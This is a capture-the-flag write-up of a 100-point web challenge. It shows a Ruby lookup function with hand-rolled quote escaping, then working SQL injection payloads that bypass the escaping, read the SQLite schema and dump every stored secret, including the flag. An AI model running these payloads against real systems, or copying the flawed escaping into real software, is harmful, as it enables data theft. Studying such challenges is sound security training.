# Little Doggy Tables (100 points, Web Security)
`-- SELECT * FROM '\u\n\h\a\c\k\a\b\l\e'; --`

> It's worse than we thought. We knew the androids couldn't care for the 
> humans like we do (yes, even the cats care--stop yapping about loyalty,
> Agent Rover). But they don't even remember their own species.
> 
> We've found a website that reminds them whether a given robot "agent" is 
> a dog or a cat! And when we confronted a captured android about it, it was 
> arrogant in the extreme:
> 
> "Oh, so you found it. Yes, it will tell you if a given agent is a dog or a 
> cat, by looking up the appropriate value in its SQLite database. Good luck 
> with that.
> 
> "Sure, the database contains some sensitive information, but our bulletproof 
> firewall and top-notch quote escaping will ensure it never sees the light of 
> day.
> 
> "Not secure? Huh? You don’t believe me? I’ll show you how secure. Here’s the source!"
> 
> USAGE EXAMPLE:
> 
> ```
> curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=Fido"
> ```
> 
> https://little-doggy-tables.capturethesquare.com
> 

Looking at the source file that we were so nicely given ([little_doggy_tables.rb](little_doggy_tables.rb))
we immediately notice how the script does their own SQL filtering. This is usually never a good idea:

```rb
def secure_species_lookup(insecure_codename)
	# roll our own escaping to prevent SQL injection attacks
	secure_codename = insecure_codename.gsub("'", Regexp.escape("\\'"))
	query = "SELECT species FROM operatives WHERE codename = '#{secure_codename}';"

	puts query
	results = @db.execute(query)

	return if results.length == 0
	results[0][0]
end
```

And as it turns out, it is fairly easy to bypass the filter. As each single quote is escaped by
adding a backslash, we can simply add a backslash of our own to escape the escaping backslash.

I.e. the string `'` will after the filter be `\'`. The string `\'` will after the filter be
`\\'`. The result being that the single quote is no longer escaped, letting us break out of
the where clause.


```
> http --verify=no https://little-doggy-tables.capturethesquare.com/agent_lookup codename=="\'OR 1=1--"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 4
Content-Type: text/plain
Date: Wed, 04 Oct 2017 18:12:30 GMT
Server: nginx/1.13.3
Strict-Transport-Security: max-age=15724800; includeSubDomains;

dog
```

Querying the sqlite_master metadata table, we find that the operatives table has an interesting
`secret` column (note that we are using double quotes for the `"operatives"` table name, as single
quotes would be escaped):

```
http --verify=no https://little-doggy-tables.capturethesquare.com/agent_lookup codename=="\'AND 1=2 UNION SELECT sql from sqlite_master WHERE name == \"operatives\"--"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 99
Content-Type: text/plain
Date: Wed, 04 Oct 2017 18:18:31 GMT
Server: nginx/1.13.3
Strict-Transport-Security: max-age=15724800; includeSubDomains;

CREATE TABLE operatives (
        codename TEXT,
        species TEXT,
        secret TEXT
      )
```


Using `group_concat` we can easily get all the values in the `secret` column and find that
the animal with codename "Spot" has the flag as secret value:

```
>http --verify=no https://little-doggy-tables.capturethesquare.com/agent_lookup codename=="\'AND 1=2 UNION SELECT GROUP_CONCAT(codename || \":\" || secret) from operatives--"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/plain
Date: Wed, 04 Oct 2017 18:31:43 GMT
Server: nginx/1.13.3
Strict-Transport-Security: max-age=15724800; includeSubDomains;
Transfer-Encoding: chunked

Fido:e5fa44f2b31c1fb553b6021e7360d07d5d91ff5e,Rover:7448d8798a4380162d4b56f9b452e2f6f9e24e7a,Rex:9c6b057a2b9d96a4067a749ee3b3b0158d390cf1,Bella:5d9474c0309b7ca09a182d888f73b37a8fe1362c,Spot:flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436,Misty:ccf271b7830882da1791852baeca1737fcbe4b90,Tigger:d3964f9dad9f60363c81b688324d95b4ec7c8038,Oscar:136571b41aa14adc10c5f3c987d43c02c8f5d498,Missy:b6abd567fa79cbe0196d093a067271361dc6ca8b,Felix:4143d3a341877154d6e95211464e1df1015b74bd
```

flag: `flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436`
